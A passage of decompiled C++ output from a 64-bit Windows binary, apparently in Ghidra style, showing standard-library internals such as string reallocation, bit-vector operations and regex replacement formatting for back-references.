      uVar1 = *param_2;
      if (pvVar2 < param_4[3]) {
        param_4[2] = (void *)((longlong)pvVar2 + 1);
        ppvVar3 = param_4;
        if ((void *)0xf < param_4[3]) {
          ppvVar3 = (void **)*param_4;
        }
        *(undefined *)((longlong)ppvVar3 + (longlong)pvVar2) = uVar1;
        *(undefined *)((longlong)ppvVar3 + 1 + (longlong)pvVar2) = 0;
      }
      else {
        FUN_140003898(param_4,1,0,uVar1);
      }
      param_2 = param_2 + 1;
    } while (param_2 != param_3);
  }
  *param_1 = param_4;
  return param_1;
}



undefined4 * FUN_140002890(undefined4 *param_1,uint **param_2,uint **param_3,uint **param_4)

{
  uint *puVar1;
  uint *puVar2;
  uint *puVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  uint *puVar7;
  uint uVar8;
  uint *puVar9;
  
  puVar1 = *param_3;
  puVar7 = param_2[1];
  while ((puVar2 = *param_2, puVar2 != puVar1 || (puVar7 != param_3[1]))) {
    puVar3 = *param_4;
    puVar9 = param_4[1];
    if ((*puVar2 & 1 << ((byte)puVar7 & 0x1f)) == 0) {
      uVar8 = *puVar3 & ~(1 << ((uint)puVar9 & 0x1f));
    }
    else {
      uVar8 = *puVar3 | 1 << ((uint)puVar9 & 0x1f);
    }
    *puVar3 = uVar8;
    if (puVar9 < (uint *)0x1f) {
      puVar9 = (uint *)((longlong)puVar9 + 1);
    }
    else {
      puVar9 = (uint *)0x0;
      *param_4 = puVar3 + 1;
    }
    param_4[1] = puVar9;
    if (puVar7 < (uint *)0x1f) {
      puVar7 = (uint *)((longlong)puVar7 + 1);
      param_2[1] = puVar7;
    }
    else {
      param_2[1] = (uint *)0x0;
      *param_2 = puVar2 + 1;
      puVar7 = (uint *)0x0;
    }
  }
  uVar4 = *(undefined4 *)((longlong)param_4 + 4);
  uVar5 = *(undefined4 *)(param_4 + 1);
  uVar6 = *(undefined4 *)((longlong)param_4 + 0xc);
  *param_1 = *(undefined4 *)param_4;
  param_1[1] = uVar4;
  param_1[2] = uVar5;
  param_1[3] = uVar6;
  return param_1;
}



void FUN_14000293c(uint **param_1,uint **param_2,char param_3)

{
  uint *puVar1;
  uint *puVar2;
  uint *puVar3;
  uint uVar4;
  char cVar5;
  uint uVar6;
  
  puVar1 = *param_1;
  puVar2 = *param_2;
  if ((puVar1 != puVar2) || (param_1[1] != param_2[1])) {
    puVar3 = param_2[1];
    uVar6 = -1 << ((byte)param_1[1] & 0x1f);
    cVar5 = (char)puVar3;
    if (puVar1 == puVar2) {
      uVar4 = 0xffffffff >> (0x20U - cVar5 & 0x1f);
      *puVar1 = (~uVar4 | ~uVar6) & *puVar1 | -(uint)(param_3 != '\0') & uVar4 & uVar6;
    }
    else {
      *puVar1 = -(uint)(param_3 != '\0') & uVar6 | *puVar1 & ~uVar6;
      memset(puVar1 + 1,-(uint)(param_3 != '\0') & 0xff,(longlong)puVar2 - (longlong)(puVar1 + 1));
      if (puVar3 != (uint *)0x0) {
        uVar6 = 0xffffffff >> (0x20U - cVar5 & 0x1f);
        *puVar2 = -(uint)(param_3 != '\0') & uVar6 | ~uVar6 & *puVar2;
      }
    }
  }
  return;
}



void FUN_140002a14(void *param_1,longlong param_2)

{
  memset(param_1,0,param_2 * 4);
  return;
}



undefined8 *
FUN_140002a24(undefined8 *param_1,longlong param_2,void **param_3,char *param_4,char *param_5)

{
  void *pvVar1;
  undefined4 *puVar2;
  longlong lVar3;
  undefined8 *puVar4;
  void **ppvVar5;
  uint uVar6;
  longlong lVar7;
  undefined *puVar8;
  char *pcVar9;
  undefined *puVar10;
  char cVar11;
  ulonglong uVar12;
  bool bVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  undefined8 local_res8;
  undefined8 local_res18;
  undefined8 local_res20;
  undefined8 local_48 [4];
  
  bVar13 = param_4 == param_5;
  do {
    if (bVar13) {
LAB_140002d14:
      *param_1 = param_3;
      return param_1;
    }
    cVar11 = *param_4;
    pcVar9 = param_4 + 1;
    if (cVar11 != '$') {
LAB_140002caa:
      pvVar1 = param_3[2];
      if (pvVar1 < param_3[3]) {
        param_3[2] = (void *)((longlong)pvVar1 + 1);
        ppvVar5 = param_3;
        if ((void *)0xf < param_3[3]) {
          ppvVar5 = (void **)*param_3;
        }
        *(undefined *)((longlong)ppvVar5 + 1 + (longlong)pvVar1) = 0;
        *(char *)((longlong)ppvVar5 + (longlong)pvVar1) = cVar11;
      }
      else {
LAB_140002c08:
        FUN_140003898(param_3,1,0,cVar11);
      }
      goto LAB_140002c17;
    }
    if (pcVar9 == param_5) {
      pvVar1 = param_3[2];
      if (pvVar1 < param_3[3]) {
        param_3[2] = (void *)((longlong)pvVar1 + 1);
        ppvVar5 = param_3;
        if ((void *)0xf < param_3[3]) {
          ppvVar5 = (void **)*param_3;
        }
        *(undefined2 *)((longlong)ppvVar5 + (longlong)pvVar1) = 0x24;
      }
      else {
        FUN_140003898(param_3,1,0,0x24);
      }
      goto LAB_140002d14;
    }
    if (*pcVar9 == '$') {
      pvVar1 = param_3[2];
      if (pvVar1 < param_3[3]) {
        param_3[2] = (void *)((longlong)pvVar1 + 1);
        ppvVar5 = param_3;
        if ((void *)0xf < param_3[3]) {
          ppvVar5 = (void **)*param_3;
        }
        *(undefined2 *)((longlong)ppvVar5 + (longlong)pvVar1) = 0x24;
      }
      else {
        FUN_140003898(param_3,1,0,0x24);
      }
LAB_140002ae0:
      pcVar9 = param_4 + 2;
    }
    else {
      if (*pcVar9 == '`') {
        puVar10 = *(undefined **)(param_2 + 0x30);
        puVar4 = &local_res8;
        puVar8 = *(undefined **)(param_2 + 0x28);
LAB_140002ad5:
        puVar4 = FUN_14000280c(puVar4,puVar8,puVar10,param_3);
        param_3 = (void **)*puVar4;
        goto LAB_140002ae0;
      }
      if (*pcVar9 == '\'') {
        puVar10 = *(undefined **)(param_2 + 0x48);
        puVar4 = &local_res18;
        puVar8 = *(undefined **)(param_2 + 0x40);
        goto LAB_140002ad5;
      }
      if (*pcVar9 == '&') {
        puVar2 = *(undefined4 **)(param_2 + 0x10);
        pcVar9 = param_4 + 2;
        lVar7 = *(longlong *)(param_2 + 0x18) - (longlong)puVar2;
        lVar3 = lVar7 >> 0x3f;
        if (lVar7 / 0x18 + lVar3 != lVar3) {
          uVar14 = *puVar2;
          uVar15 = puVar2[1];
          puVar10 = *(undefined **)(puVar2 + 2);
          puVar4 = &local_res20;
LAB_140002c59:
          puVar4 = FUN_14000280c(puVar4,(undefined *)CONCAT44(uVar15,uVar14),puVar10,param_3);
          param_3 = (void **)*puVar4;
        }
      }
      else {
        if (9 < (byte)(*pcVar9 - 0x30U)) {
          pvVar1 = param_3[2];
          if (pvVar1 < param_3[3]) {
            param_3[2] = (void *)((longlong)pvVar1 + 1);
            ppvVar5 = param_3;
            if ((void *)0xf < param_3[3]) {
              ppvVar5 = (void **)*param_3;
            }
            *(undefined2 *)((longlong)ppvVar5 + (longlong)pvVar1) = 0x24;
          }
          else {
            FUN_140003898(param_3,1,0,0x24);
          }
          cVar11 = *pcVar9;
          pcVar9 = param_4 + 2;
          goto LAB_140002caa;
        }
        cVar11 = *pcVar9;
        pcVar9 = param_4 + 2;
        uVar6 = (int)cVar11 - 0x30;
        if ((pcVar9 == param_5) || (cVar11 = *pcVar9, 9 < (byte)(cVar11 - 0x30U))) {
          bVar13 = false;
        }
        else {
          bVar13 = true;
          pcVar9 = param_4 + 3;
          uVar6 = (int)cVar11 + (uVar6 * 5 + -0x18) * 2;
        }
        if (uVar6 == 0) {
          pvVar1 = param_3[2];
          if (pvVar1 < param_3[3]) {
            param_3[2] = (void *)((longlong)pvVar1 + 1);
            ppvVar5 = param_3;
            if ((void *)0xf < param_3[3]) {
              ppvVar5 = (void **)*param_3;
            }
            *(undefined2 *)((longlong)ppvVar5 + (longlong)pvVar1) = 0x24;
          }
          else {
            FUN_140003898(param_3,1,0,0x24);
          }
          pvVar1 = param_3[2];
          if (pvVar1 < param_3[3]) {
            param_3[2] = (void *)((longlong)pvVar1 + 1);
            ppvVar5 = param_3;
            if ((void *)0xf < param_3[3]) {
              ppvVar5 = (void **)*param_3;
            }
            *(undefined2 *)((longlong)ppvVar5 + (longlong)pvVar1) = 0x30;
          }
          else {
            FUN_140003898(param_3,1,0,0x30);
          }
          if (bVar13) {
            pvVar1 = param_3[2];
            if (param_3[3] <= pvVar1) {
              cVar11 = '0';
              goto LAB_140002c08;
            }
            param_3[2] = (void *)((longlong)pvVar1 + 1);
            ppvVar5 = param_3;
            if ((void *)0xf < param_3[3]) {
              ppvVar5 = (void **)*param_3;
            }
            *(undefined2 *)((longlong)ppvVar5 + (longlong)pvVar1) = 0x30;
          }
        }
        else {
          lVar3 = *(longlong *)(param_2 + 0x10);
          uVar12 = (ulonglong)uVar6;
          if (uVar12 < (ulonglong)((*(longlong *)(param_2 + 0x18) - lVar3) / 0x18)) {
            puVar2 = (undefined4 *)(lVar3 + uVar12 * 0x18);
            uVar14 = *puVar2;
            uVar15 = puVar2[1];
            puVar10 = *(undefined **)(lVar3 + 8 + uVar12 * 0x18);
            puVar4 = local_48;
            goto LAB_140002c59;
          }
        }
      }
    }
LAB_140002c17:
    bVar13 = pcVar9 == param_5;
    param_4 = pcVar9;
  } while( true );
}



undefined8 *
FUN_140002d2c(undefined8 *param_1,longlong param_2,void **param_3,char *param_4,char *param_5)

{
  undefined4 *puVar1;
  longlong lVar2;
  void *pvVar3;
  undefined8 *puVar4;
  void **ppvVar5;
  longlong lVar6;
  char *pcVar7;
  undefined *puVar8;
  char cVar9;
  ulonglong uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined8 local_res8;
  undefined8 local_res18;
  
  if (param_4 != param_5) {
    do {
      cVar9 = *param_4;
      pcVar7 = param_4 + 1;
      if (cVar9 == '&') {
        puVar1 = *(undefined4 **)(param_2 + 0x10);
        lVar6 = *(longlong *)(param_2 + 0x18) - (longlong)puVar1;
        lVar2 = lVar6 >> 0x3f;
        if (lVar6 / 0x18 + lVar2 != lVar2) {
          uVar11 = *puVar1;
          uVar12 = puVar1[1];
          puVar8 = *(undefined **)(puVar1 + 2);
          puVar4 = &local_res8;
LAB_140002e01:
          puVar4 = FUN_14000280c(puVar4,(undefined *)CONCAT44(uVar12,uVar11),puVar8,param_3);
          param_3 = (void **)*puVar4;
        }
      }
      else {
        if (cVar9 == '\\') {
          if (pcVar7 == param_5) break;
          cVar9 = *pcVar7;
          pcVar7 = param_4 + 2;
          if ((byte)(cVar9 - 0x30U) < 10) {
            lVar2 = *(longlong *)(param_2 + 0x10);
            uVar10 = (ulonglong)((int)cVar9 - 0x30);
            if (uVar10 < (ulonglong)((*(longlong *)(param_2 + 0x18) - lVar2) / 0x18)) {
              puVar1 = (undefined4 *)(lVar2 + uVar10 * 0x18);
              uVar11 = *puVar1;
              uVar12 = puVar1[1];
              puVar8 = *(undefined **)(lVar2 + 8 + uVar10 * 0x18);
              puVar4 = &local_res18;
              goto LAB_140002e01;
            }
            goto LAB_140002e4c;
          }
        }
        pvVar3 = param_3[2];
        if (pvVar3 < param_3[3]) {
          param_3[2] = (void *)((longlong)pvVar3 + 1);
          ppvVar5 = param_3;
          if ((void *)0xf < param_3[3]) {
            ppvVar5 = (void **)*param_3;
          }
          *(undefined *)((longlong)ppvVar5 + 1 + (longlong)pvVar3) = 0;
          *(char *)((longlong)ppvVar5 + (longlong)pvVar3) = cVar9;
        }
        else {
          FUN_140003898(param_3,1,0,cVar9);
        }
      }
LAB_140002e4c:
      param_4 = pcVar7;
    } while (pcVar7 != param_5);
  }
  *param_1 = param_3;
  return param_1;
}



undefined ** FUN_140002ea8(void)

{
  return &PTR_vftable_140017000;
}



undefined ** FUN_140002eb0(void)

{
  return &PTR_vftable_140017010;
}



uint FUN_1400030a4(void *param_1)

{
  uint uVar1;
  undefined4 local_res10 [6];
  
  local_res10[0] = 0;
  uVar1 = memcmp(param_1,local_res10,4);
  return uVar1 & 0xffffff00 | (uint)(uVar1 == 0);
}



char * FUN_1400030c8(char *param_1,char *param_2,uint *param_3)

{
  char cVar1;
  uint uVar2;
  ulonglong uVar3;
  char *pcVar4;
  uint uVar5;
  
  do {
    if (param_3 == (uint *)0x0) {
      return param_1;
    }
    uVar5 = 0;
    if (param_3[3] != 0) {
      uVar2 = *param_3;
      do {
        uVar3 = 0;
        pcVar4 = param_1;
        if ((ulonglong)uVar2 != 0) {
          do {
            cVar1 = *pcVar4;
            pcVar4 = pcVar4 + 1;
            if (cVar1 != *(char *)((ulonglong)uVar5 + *(longlong *)(param_3 + 4) + uVar3)) break;
            uVar3 = uVar3 + 1;
          } while (uVar3 < uVar2);
        }
        if (pcVar4 == param_2) {
          return param_2;
        }
        uVar5 = uVar5 + uVar2;
      } while (uVar5 < param_3[3]);
    }
    param_3 = *(uint **)(param_3 + 6);
  } while( true );
}



ulonglong FUN_140003134(uint param_1,longlong param_2)

{
  ulonglong in_RAX;
  uint uVar1;
  ulonglong uVar2;
  
  uVar2 = 0;
  if (*(uint *)(param_2 + 4) != 0) {
    do {
      if ((*(byte *)(uVar2 + *(longlong *)(param_2 + 8)) <= param_1) &&
         (in_RAX = 0, param_1 <= *(byte *)((ulonglong)((int)uVar2 + 1) + *(longlong *)(param_2 + 8))
         )) {
        return 1;
      }
      uVar1 = (int)uVar2 + 2;
      uVar2 = (ulonglong)uVar1;
    } while (uVar1 < *(uint *)(param_2 + 4));
  }
  return in_RAX & 0xffffffffffffff00;
}



ulonglong FUN_14000316c(byte **param_1,byte **param_2,undefined param_3)

{
  ulonglong **ppuVar1;
  byte *pbVar2;
  uint uVar3;
  int iVar4;
  ulonglong uVar5;
  byte *pbVar6;
  uint uVar7;
  
  ppuVar1 = (ulonglong **)(param_2 + 2);
  if (param_2 != (byte **)0x0) {
    *(undefined *)(param_2 + 1) = 1;
    FUN_140004504(ppuVar1,0);
  }
  param_1[0x13] = param_1[0x15];
  *param_1 = param_1[0x15];
  uVar3 = FUN_140009fd8((longlong)param_1);
  FUN_14000ca9c((uint **)(param_1 + 1),(uint *)(ulonglong)uVar3,'\0');
  uVar3 = FUN_140009fd8((longlong)param_1);
  FUN_140004480(param_1 + 5,(ulonglong)uVar3);
  *(undefined *)(param_1 + 0x1b) = param_3;
  *(undefined4 *)((longlong)param_1 + 0xdc) = 10000000;
  *(bool *)((longlong)param_1 + 0xc1) = param_2 != (byte **)0x0;
  *(undefined4 *)(param_1 + 0x1c) = 600;
  *(undefined *)(param_1 + 0x18) = 0;
  uVar5 = FUN_14000a6e4(param_1,(longlong)param_1[0x16]);
  if ((char)uVar5 != '\0') {
    if (param_2 != (byte **)0x0) {
      uVar3 = FUN_140009fd8((longlong)param_1);
      FUN_140004504(ppuVar1,(ulonglong)uVar3);
      iVar4 = FUN_140009fd8((longlong)param_1);
      uVar5 = 0;
      if (iVar4 != 0) {
        do {
          if ((*(uint *)(param_1[9] + (uVar5 >> 5) * 4) >> ((byte)uVar5 & 0x1f) & 1) == 0) {
            *(undefined *)(*ppuVar1 + uVar5 * 3 + 2) = 0;
            (*ppuVar1)[uVar5 * 3] = (ulonglong)param_1[0x14];
            pbVar6 = param_1[0x14];
          }
          else {
            *(undefined *)(*ppuVar1 + uVar5 * 3 + 2) = 1;
            (*ppuVar1)[uVar5 * 3] = *(ulonglong *)(param_1[0xd] + uVar5 * 0x10);
            pbVar6 = *(byte **)(param_1[0xd] + uVar5 * 0x10 + 8);
          }
          uVar7 = (int)uVar5 + 1;
          (*ppuVar1)[uVar5 * 3 + 1] = (ulonglong)pbVar6;
          uVar3 = FUN_140009fd8((longlong)param_1);
          uVar5 = (ulonglong)uVar7;
        } while (uVar7 < uVar3);
      }
      *param_2 = param_1[0x13];
      pbVar6 = param_1[0x13];
      param_2[5] = pbVar6;
      pbVar2 = (byte *)**ppuVar1;
      param_2[6] = pbVar2;
      uVar5 = (ulonglong)pbVar2 & 0xffffffffffffff00;
      *(bool *)(param_2 + 7) = pbVar6 != pbVar2;
      pbVar6 = (byte *)(*ppuVar1)[1];
      param_2[8] = pbVar6;
      pbVar2 = param_1[0x14];
      param_2[9] = pbVar2;
      *(bool *)(param_2 + 10) = pbVar6 != pbVar2;
      param_2[0xb] = param_1[0x14];
      param_2[0xc] = param_1[0x14];
    }
    uVar5 = CONCAT71((int7)(uVar5 >> 8),1);
  }
  return uVar5;
}



void ** FUN_140003350(void **param_1,void *param_2,undefined8 param_3,void *param_4)

{
  void *pvVar1;
  void *pvVar2;
  code *pcVar3;
  void *_Dst;
  void **ppvVar4;
  __uint64 _Var5;
  void *pvVar6;
  void *pvVar7;
  
  pvVar7 = (void *)0x7ffffffffffffffe;
  if ((void *)0x7ffffffffffffffe < param_2) {
    FUN_14000ba60();
    pcVar3 = (code *)swi(3);
    ppvVar4 = (void **)(*pcVar3)();
    return ppvVar4;
  }
  pvVar2 = param_1[3];
  pvVar6 = (void *)((ulonglong)param_2 | 7);
  _Dst = (void *)0x0;
  if ((pvVar6 < (void *)0x7fffffffffffffff) &&
     (pvVar2 <= (void *)(0x7ffffffffffffffe - ((ulonglong)pvVar2 >> 1)))) {
    pvVar1 = (void *)(((ulonglong)pvVar2 >> 1) + (longlong)pvVar2);
    pvVar7 = pvVar6;
    if (pvVar6 < pvVar1) {
      pvVar7 = pvVar1;
    }
    if (0x7fffffffffffffff < (longlong)pvVar7 + 1U) {
      FUN_14000b454();
      pcVar3 = (code *)swi(3);
      ppvVar4 = (void **)(*pcVar3)();
      return ppvVar4;
    }
    _Var5 = ((longlong)pvVar7 + 1U) * 2;
    if (_Var5 < 0x1000) {
      if (_Var5 != 0) {
        _Dst = operator_new(_Var5);
      }
      goto LAB_140003404;
    }
  }
  else {
    _Var5 = 0xfffffffffffffffe;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(_Var5);
LAB_140003404:
  param_1[3] = pvVar7;
  param_1[2] = param_2;
  memcpy(_Dst,param_4,(longlong)param_2 * 2);
  *(undefined2 *)((longlong)param_2 * 2 + (longlong)_Dst) = 0;
  if ((void *)0x7 < pvVar2) {
    pvVar7 = *param_1;
    pvVar6 = pvVar7;
    if ((0xfff < (longlong)pvVar2 * 2 + 2U) &&
       (pvVar6 = *(void **)((longlong)pvVar7 + -8),
       0x1f < (ulonglong)((longlong)pvVar7 + (-8 - (longlong)pvVar6)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar6);
  }
  *param_1 = _Dst;
  return param_1;
}



void ** FUN_140003494(void **param_1,void *param_2,undefined8 param_3,void *param_4)

{
  void *pvVar1;
  code *pcVar2;
  void **ppvVar3;
  ulonglong uVar4;
  void *pvVar5;
  void *pvVar6;
  void *pvVar7;
  
  pvVar7 = (void *)0x7fffffffffffffff;
  if ((void *)0x7fffffffffffffff < param_2) {
    FUN_14000ba60();
    pcVar2 = (code *)swi(3);
    ppvVar3 = (void **)(*pcVar2)();
    return ppvVar3;
  }
  pvVar1 = param_1[3];
  pvVar6 = (void *)((ulonglong)param_2 | 0xf);
  if ((pvVar6 < (void *)0x8000000000000000) &&
     (pvVar1 <= (void *)(0x7fffffffffffffff - ((ulonglong)pvVar1 >> 1)))) {
    pvVar5 = (void *)(((ulonglong)pvVar1 >> 1) + (longlong)pvVar1);
    pvVar7 = pvVar6;
    if (pvVar6 < pvVar5) {
      pvVar7 = pvVar5;
    }
    uVar4 = (longlong)pvVar7 + 1;
    if (uVar4 < 0x1000) {
      if (uVar4 == 0) {
        pvVar6 = (void *)0x0;
      }
      else {
        pvVar6 = operator_new(uVar4);
      }
      goto LAB_140003525;
    }
  }
  else {
    uVar4 = 0x8000000000000000;
  }
  pvVar6 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar4);
LAB_140003525:
  param_1[2] = param_2;
  param_1[3] = pvVar7;
  memcpy(pvVar6,param_4,(size_t)param_2);
  *(undefined *)((longlong)pvVar6 + (longlong)param_2) = 0;
  if ((void *)0xf < pvVar1) {
    pvVar7 = *param_1;
    pvVar5 = pvVar7;
    if ((0xfff < (longlong)pvVar1 + 1U) &&
       (pvVar5 = *(void **)((longlong)pvVar7 + -8),
       0x1f < (ulonglong)((longlong)pvVar7 + (-8 - (longlong)pvVar5)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar5);
  }
  *param_1 = pvVar6;
  return param_1;
}



void ** FUN_1400035a0(void **param_1,ulonglong param_2,undefined8 param_3,void *param_4,
                     longlong param_5)

{
  void *pvVar1;
  void *pvVar2;
  code *pcVar3;
  size_t _Size;
  void *_Dst;
  void **ppvVar4;
  __uint64 _Var5;
  void *pvVar6;
  void *pvVar7;
  void *pvVar8;
  
  pvVar8 = param_1[2];
  pvVar7 = (void *)0x7ffffffffffffffe;
  if (0x7ffffffffffffffeU - (longlong)pvVar8 < param_2) {
    FUN_14000ba60();
    pcVar3 = (code *)swi(3);
    ppvVar4 = (void **)(*pcVar3)();
    return ppvVar4;
  }
  pvVar2 = param_1[3];
  _Dst = (void *)0x0;
  pvVar6 = (void *)((ulonglong)(void *)((longlong)pvVar8 + param_2) | 7);
  if ((pvVar6 < (void *)0x7fffffffffffffff) &&
     (pvVar2 <= (void *)(0x7ffffffffffffffe - ((ulonglong)pvVar2 >> 1)))) {
    pvVar1 = (void *)(((ulonglong)pvVar2 >> 1) + (longlong)pvVar2);
    pvVar7 = pvVar6;
    if (pvVar6 < pvVar1) {
      pvVar7 = pvVar1;
    }
    if (0x7fffffffffffffff < (longlong)pvVar7 + 1U) {
      FUN_14000b454();
      pcVar3 = (code *)swi(3);
      ppvVar4 = (void **)(*pcVar3)();
      return ppvVar4;
    }
    _Var5 = ((longlong)pvVar7 + 1U) * 2;
    if (_Var5 < 0x1000) {
      if (_Var5 != 0) {
        _Dst = operator_new(_Var5);
      }
      goto LAB_140003661;
    }
  }
  else {
    _Var5 = 0xfffffffffffffffe;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(_Var5);
LAB_140003661:
  _Size = (longlong)pvVar8 * 2;
  param_1[2] = (void *)((longlong)pvVar8 + param_2);
  param_1[3] = pvVar7;
  if (pvVar2 < (void *)0x8) {
    memcpy(_Dst,param_1,_Size);
    memcpy((void *)(_Size + (longlong)_Dst),param_4,param_5 * 2);
    *(undefined2 *)((longlong)_Dst + ((longlong)pvVar8 + param_5) * 2) = 0;
  }
  else {
    pvVar7 = *param_1;
    memcpy(_Dst,pvVar7,_Size);
    memcpy((void *)(_Size + (longlong)_Dst),param_4,param_5 * 2);
    *(undefined2 *)((longlong)_Dst + ((longlong)pvVar8 + param_5) * 2) = 0;
    pvVar8 = pvVar7;
    if ((0xfff < (longlong)pvVar2 * 2 + 2U) &&
       (pvVar8 = *(void **)((longlong)pvVar7 + -8),
       0x1f < (ulonglong)((longlong)pvVar7 + (-8 - (longlong)pvVar8)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar8);
  }
  *param_1 = _Dst;
  return param_1;
}



void ** FUN_14000372c(void **param_1,ulonglong param_2,undefined8 param_3,undefined2 param_4)

{
  void *pvVar1;
  void *pvVar2;
  void *pvVar3;
  code *pcVar4;
  size_t _Size;
  void *_Dst;
  void **ppvVar5;
  __uint64 _Var6;
  void *pvVar7;
  void *pvVar8;
  
  pvVar2 = param_1[2];
  pvVar8 = (void *)0x7ffffffffffffffe;
  if (0x7ffffffffffffffeU - (longlong)pvVar2 < param_2) {
    FUN_14000ba60();
    pcVar4 = (code *)swi(3);
    ppvVar5 = (void **)(*pcVar4)();
    return ppvVar5;
  }
  pvVar3 = param_1[3];
  _Dst = (void *)0x0;
  pvVar7 = (void *)((ulonglong)(void *)((longlong)pvVar2 + param_2) | 7);
  if ((pvVar7 < (void *)0x7fffffffffffffff) &&
     (pvVar3 <= (void *)(0x7ffffffffffffffe - ((ulonglong)pvVar3 >> 1)))) {
    pvVar1 = (void *)(((ulonglong)pvVar3 >> 1) + (longlong)pvVar3);
    pvVar8 = pvVar7;
    if (pvVar7 < pvVar1) {
      pvVar8 = pvVar1;
    }
    if (0x7fffffffffffffff < (longlong)pvVar8 + 1U) {
      FUN_14000b454();
      pcVar4 = (code *)swi(3);
      ppvVar5 = (void **)(*pcVar4)();
      return ppvVar5;
    }
    _Var6 = ((longlong)pvVar8 + 1U) * 2;
    if (_Var6 < 0x1000) {
      if (_Var6 != 0) {
        _Dst = operator_new(_Var6);
      }
      goto LAB_1400037ee;
    }
  }
  else {
    _Var6 = 0xfffffffffffffffe;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(_Var6);
LAB_1400037ee:
  _Size = (longlong)pvVar2 * 2;
  param_1[2] = (void *)((longlong)pvVar2 + param_2);
  param_1[3] = pvVar8;
  if (pvVar3 < (void *)0x8) {
    memcpy(_Dst,param_1,_Size);
    *(undefined2 *)(_Size + (longlong)_Dst) = param_4;
    *(undefined2 *)(_Size + 2 + (longlong)_Dst) = 0;
  }
  else {
    pvVar2 = *param_1;
    memcpy(_Dst,pvVar2,_Size);
    *(undefined2 *)(_Size + (longlong)_Dst) = param_4;
    *(undefined2 *)(_Size + 2 + (longlong)_Dst) = 0;
    pvVar8 = pvVar2;
    if ((0xfff < (longlong)pvVar3 * 2 + 2U) &&
       (pvVar8 = *(void **)((longlong)pvVar2 + -8),
       0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)pvVar8)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar8);
  }
  *param_1 = _Dst;
  return param_1;
}



void ** FUN_140003898(void **param_1,ulonglong param_2,undefined8 param_3,undefined param_4)

{
  undefined *puVar1;
  void *_Src;
  code *pcVar2;
  void *_Dst;
  void **ppvVar3;
  undefined *puVar4;
  undefined *puVar5;
  void *pvVar6;
  
  pvVar6 = param_1[2];
  puVar5 = (undefined *)0x7fffffffffffffff;
  if (0x7fffffffffffffffU - (longlong)pvVar6 < param_2) {
    FUN_14000ba60();
    pcVar2 = (code *)swi(3);
    ppvVar3 = (void **)(*pcVar2)();
    return ppvVar3;
  }
  puVar1 = (undefined *)param_1[3];
  puVar4 = (undefined *)((ulonglong)(void *)((longlong)pvVar6 + param_2) | 0xf);
  if ((puVar4 < (undefined *)0x8000000000000000) &&
     (puVar1 <= (undefined *)(0x7fffffffffffffff - ((ulonglong)puVar1 >> 1)))) {
    puVar5 = puVar4;
    if (puVar4 < puVar1 + ((ulonglong)puVar1 >> 1)) {
      puVar5 = puVar1 + ((ulonglong)puVar1 >> 1);
    }
    puVar4 = puVar5 + 1;
    if (puVar4 < (undefined *)0x1000) {
      if (puVar4 == (undefined *)0x0) {
        _Dst = (void *)0x0;
      }
      else {
        _Dst = operator_new((__uint64)puVar4);
      }
      goto LAB_14000393c;
    }
  }
  else {
    puVar4 = (undefined *)0x8000000000000000;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_
                   ((__uint64)puVar4);
LAB_14000393c:
  param_1[2] = (void *)((longlong)pvVar6 + param_2);
  param_1[3] = puVar5;
  if (puVar1 < &DAT_00000010) {
    memcpy(_Dst,param_1,(size_t)pvVar6);
    *(undefined *)((longlong)_Dst + (longlong)pvVar6) = param_4;
    *(undefined *)((longlong)_Dst + 1 + (longlong)pvVar6) = 0;
  }
  else {
    _Src = *param_1;
    memcpy(_Dst,_Src,(size_t)pvVar6);
    *(undefined *)((longlong)_Dst + (longlong)pvVar6) = param_4;
    *(undefined *)((longlong)_Dst + 1 + (longlong)pvVar6) = 0;
    pvVar6 = _Src;
    if (((undefined *)0xfff < puVar1 + 1) &&
       (pvVar6 = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)pvVar6)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar6);
  }
  *param_1 = _Dst;
  return param_1;
}



void ** FUN_1400039d8(void **param_1,ulonglong param_2,undefined8 param_3,void *param_4,
                     size_t param_5)

{
  void *_Dst;
  undefined *puVar1;
  void *_Src;
  code *pcVar2;
  void *_Dst_00;
  void **ppvVar3;
  undefined *puVar4;
  undefined *puVar5;
  void *pvVar6;
  
  pvVar6 = param_1[2];
  puVar5 = (undefined *)0x7fffffffffffffff;
  if (0x7fffffffffffffffU - (longlong)pvVar6 < param_2) {
    FUN_14000ba60();
    pcVar2 = (code *)swi(3);
    ppvVar3 = (void **)(*pcVar2)();
    return ppvVar3;
  }
  puVar1 = (undefined *)param_1[3];
  puVar4 = (undefined *)((ulonglong)(void *)((longlong)pvVar6 + param_2) | 0xf);
  if ((puVar4 < (undefined *)0x8000000000000000) &&
     (puVar1 <= (undefined *)(0x7fffffffffffffff - ((ulonglong)puVar1 >> 1)))) {
    puVar5 = puVar4;
    if (puVar4 < puVar1 + ((ulonglong)puVar1 >> 1)) {
      puVar5 = puVar1 + ((ulonglong)puVar1 >> 1);
    }
    puVar4 = puVar5 + 1;
    if (puVar4 < (undefined *)0x1000) {
      if (puVar4 == (undefined *)0x0) {
        _Dst_00 = (void *)0x0;
      }
      else {
        _Dst_00 = operator_new((__uint64)puVar4);
      }
      goto LAB_140003a7b;
    }
  }
  else {
    puVar4 = (undefined *)0x8000000000000000;
  }
  _Dst_00 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_
                      ((__uint64)puVar4);
LAB_140003a7b:
  param_1[2] = (void *)((longlong)pvVar6 + param_2);
  _Dst = (void *)((longlong)_Dst_00 + (longlong)pvVar6);
  param_1[3] = puVar5;
  if (puVar1 < &DAT_00000010) {
